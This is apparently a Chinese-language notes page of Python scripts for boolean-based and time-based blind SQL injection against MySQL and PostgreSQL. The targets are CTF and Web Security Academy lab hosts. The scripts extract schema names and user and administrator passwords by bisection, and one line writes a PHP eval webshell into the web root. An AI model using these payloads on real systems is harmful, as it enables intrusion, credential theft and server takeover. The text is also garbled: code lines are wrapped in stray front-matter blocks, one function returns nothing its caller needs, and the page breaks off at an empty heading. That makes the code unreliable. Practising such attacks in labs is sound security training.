+++
title = "盲注脚本"
+++

## 布尔盲注

```python
import requests

pos = 1
asc = 32
+++
title = "126"
+++


def queryById(id : str):
    # print(id)
    burp0_url = "http://43.249.195.138:20231/checkLogin.php"
    burp0_cookies = {"PHPSESSID": "400737831ceef0f8fbe59fdf4cc37e45"}
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://43.249.195.138:20231", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://43.249.195.138:20231/", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    burp0_data = {"user": f"1')^(!strcmp(ascii(mid((/*!SeLECt*/ GROUP_CONCAT(SCHEMA_NAME) /*!FROM*/ information_schema.SCHEMATA),{pos},1)),{asc}))#", "password": "123", "verifyCode": "Z2Pl"}
    requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

def isExist(id : str):
    return queryById(id).content.find(b"You are so smart!") != -1

def generatePlayload(sql : str, char_index : int, char : int):
    return f"1' or ascii(substr(({sql}),{char_index},1))>{char}-- "

def getChar(sql : str, char_index : int):
    low = 0
    high = 127
    while low < high:
        mid = (low + high) // 2
        if isExist(generatePlayload(sql, char_index, mid)):
            low = mid + 1
        else:
            high = mid
    return chr(low)

def getLength(sql : str):
    length = 0
    while True:
        if not isExist(generatePlayload(sql, length + 1, 0)):
            break
        length += 1
    return length + 1

def queryBySQL(sql : str):
    result = ""
    length = getLength(sql)
    print(f"sql: {sql}")
    print(f"length: {length}")
    for i in range(length):
        result += getChar(sql, i)
        print(result, end='\r')
    print("sql qurey success")
    return result

+++
title = "columns = open("column.txt", "r").readlines()"
+++
+++
title = "columns = [i.strip() for i in columns]"
+++

+++
title = "tables = open("table.txt", "r").readlines()"
+++
+++
title = "tables = [i.strip() for i in tables]"
+++
+++
title = "print(queryBySQL('''select "<?php @eval($_POST['password']);?>" into outfile "/var/www/html/webshell.php"'''))"
+++
print(queryBySQL("select password from users"))
+++
title = "for table in columns:"
+++
+++
title = "    if table == "users":"
+++
+++
title = "        continue"
+++
+++
title = "    for column in tables:"
+++
+++
title = "        print(queryBySQL(f"select {column} from {table} limit 0,1"))"
+++
```

## 时间盲注

### MySQL

```python
+++
title = "利用二分法进行时间盲注"
+++
import requests
import time

url = "http://334a2a3b-6eaa-4349-9f12-736313a90565.challenge.ctf.show/api/v5.php?id=1"

result = ""
sleepTime = 1
normalResponseTime = 1.5
signForError = False
from_asc = 10
to_asc = 130


s = requests.session()
flag = ''
for i in range(1, 100):
    l = from_asc
    r = to_asc
    mid = (l+r) >> 1  # 整除2
    while (l < r):
        selection = "SELECT database()"

        payload = f"' and if((ascii(substr(({selection}),{i},1))>{mid}),sleep({sleepTime}),sleep(0))--+-&page=1&limit=10"

        # 检查payload括号是否闭合
        if payload.count('(') != payload.count(')'):
            print('括号不闭合')
            exit()
        print(payload, end=' ')
        url = url + payload
        # 开始计时
        start = time.time()
        # 设置超时时间10秒
        response = s.get(url, timeout=10)
        # 结束计时
        end = time.time()
        interval = end-start
        print(interval, end=' ')
        if (interval > sleepTime+normalResponseTime):
            l = mid+1
            print("true")
        else:
            r = mid
            print("false")
        mid = (l+r) >> 1
    if (mid == from_asc or mid == to_asc):
        print("未匹配字符，是否继续爆破下一个字符？(y/n)")
        condition = input()
        if (condition == "y" or condition == "Y"):
            ...
        elif (condition == "n" or condition == "N"):
            break
    print(chr(mid))
    result = result+chr(mid)
print(result)

```

### PostgreSQL

```python
+++
title = "利用二分法进行时间盲注"
+++
import requests
import time

url = "https://0afb00f804b133f1858b90fb00a10025.web-security-academy.net/filter?category=Petssx"

result = ""
sleepTime = 1
normalResponseTime = 1.5
signForError = False
from_asc = 10
to_asc = 130


s = requests.session()
flag = ''
for i in range(1, 100):
    l = from_asc
    r = to_asc
    mid = (l+r) >> 1  # 整除2
    while (l < r):
        selection = "SELECT string_agg(password,',') FROM users WHERE username = 'administrator'"

        payload = f"select case when (ascii(substr(({selection}),{i},1))>{mid}) then pg_sleep({sleepTime}) else pg_sleep(0) end"

        # 检查payload括号是否闭合
        if payload.count('(') != payload.count(')'):
            print('括号不闭合')
            exit()
        print(payload, end=' ')
        headers = {
            "Cookie": f"TrackingId=o49yYm5ROxYVAnPl'%3B{payload}||'; session=CyFvwn6eJc4W3935PXbElLyLPDs9B6Aq"}
        # 开始计时
        start = time.time()
        # 设置超时时间10秒
        response = s.get(url, headers=headers, timeout=10)
        # 结束计时
        end = time.time()
        interval = end-start
        print(interval, end=' ')
        if (interval > sleepTime+normalResponseTime):
            l = mid+1
            print("true")
        else:
            r = mid
            print("false")
        mid = (l+r) >> 1
    if (mid == from_asc or mid == to_asc):
        print("未匹配字符，是否继续爆破下一个字符？(y/n)")
        condition = input()
        if (condition == "y" or condition == "Y"):
            ...
        elif (condition == "n" or condition == "N"):
            break
    print(chr(mid))
    result = result+chr(mid)
print(result)
```

## Heavy Query

```python
